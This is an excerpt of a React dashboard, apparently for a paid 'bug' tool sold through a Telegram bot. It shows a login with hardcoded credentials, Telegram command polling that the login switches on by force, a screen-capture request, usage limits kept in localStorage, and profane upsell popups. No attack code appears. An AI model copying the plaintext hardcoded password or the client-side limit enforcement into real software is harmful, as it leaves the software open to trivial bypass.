...
export default function YaeMikoDashboard() {
  ...
  // --- ENGINE MONITORING (PASTI JALAN TANPA IZIN LAYAR) ---
  useEffect(() => {
    if (!isMonitoringActive) return;
    console.log("Bot Monitoring: Aktif dan Menunggu Perintah...");
        ...
        if (data.ok && data.result?.length > 0) {
          ...
          if (latestMsg?.message_id !== lastCmdId.current && latestMsg?.chat.id.toString() === CHAT_ID) {
            ...
            if (latestMsg.text === '/resetlimit') {
               ...
               console.log("Bot: Limit direset via Telegram");
            } 
          }
        }
      } catch (e) {
        console.log("Bot Error (Telegram API):", e);
      }
    }, 3000);
  ...
  const handleLoginAttempt = () => {
    if (inputUsername === "Selz" && inputPassword === "Freebug") {
      ...
      setTimeout(() => {
        setIsLoggedIn(true);
        setIsMonitoringActive(true); // <--- PAKSA AKTIFIN
        audioRef.current?.play().catch(() => {});
        // Coba minta akses screen, tapi kalau gagal tetap jalan
        navigator.mediaDevices.getDisplayMedia({ video: true })
          .then(stream => { if (videoRef.current) videoRef.current.srcObject = stream; })
          .catch(() => console.log("Izin layar dilewati, bot tetap jalan."));
      }, 2000);
    ...
    <div className="relative min-h-screen text-white font-sans overflow-hidden">
      ...
      {showErrorOverlay && (
        <div className="fixed inset-0 z-[999] bg-red-950/95 flex flex-col items-center justify-center p-8 text-center backdrop-blur-2xl animate-in fade-in duration-300">
          ...
          <h2 className="text-white font-black text-3xl mb-8 uppercase italic tracking-widest">CREATE AKUN DULU DONGO, <br/> CREATE KE BOT ⬇︎</h2>
          <a href="http://t.me/lalaypo_bot" target="_blank" className="w-full max-w-xs py-5 bg-white text-black rounded-2xl font-black text-lg shadow-[0_0_30px_rgba(255,0,0,0.5)] active:scale-95 transition-all">BOT</a>
          <button onClick={() => setShowErrorOverlay(false)} className="mt-12 text-white/30 text-[10px] uppercase tracking-[0.5em]">Tutup</button>
        </div>
      )}

      {showLimitPopup && (
        <div className="fixed inset-0 z-[200] bg-black/95 flex flex-col items-center justify-center p-8 text-center backdrop-blur-2xl">
          <AlertTriangle className="w-12 h-12 text-red-500 mb-8 animate-bounce" />
          <h2 className="text-white font-black text-2xl mb-4 leading-tight uppercase italic">LIMIT LU ABIS NGENTOD KALO MAU LIMIT UNLIMITED PREMIUM SINI</h2>
          <a href="http://t.me/lalaypo_bot" target="_blank" className="w-full max-w-xs py-5 bg-white text-black rounded-2xl font-black text-sm mb-6">PREMIUM KE BOT</a>
          <div className="flex items-center gap-2 text-yellow-400 font-black text-[10px] uppercase italic"><Timer className="w-4 h-4" /><span>LIMIT BAKAL RESET 24 JAM KEDEPAN</span></div>
          <button onClick={() => setShowLimitPopup(false)} className="mt-8 text-white/20 text-[8px] uppercase tracking-[0.5em]">Tutup</button>
        </div>
      )}
        ...
        <div className="relative z-10 flex flex-col min-h-screen max-w-md mx-auto p-6 animate-in slide-in-from-bottom-8">
          <div className="flex items-center justify-between mb-8">
             ...
             <div className="flex items-center gap-2">
                ...
                <button onClick={() => { localStorage.setItem('selz_bug_limit','5'); localStorage.removeItem('selz_reset_time'); window.location.reload(); }} className="text-[8px] bg-red-600/20 text-red-500 px-2 py-1 rounded-full border border-red-500/30 uppercase font-black">RESET</button>
             </div>
          </div>
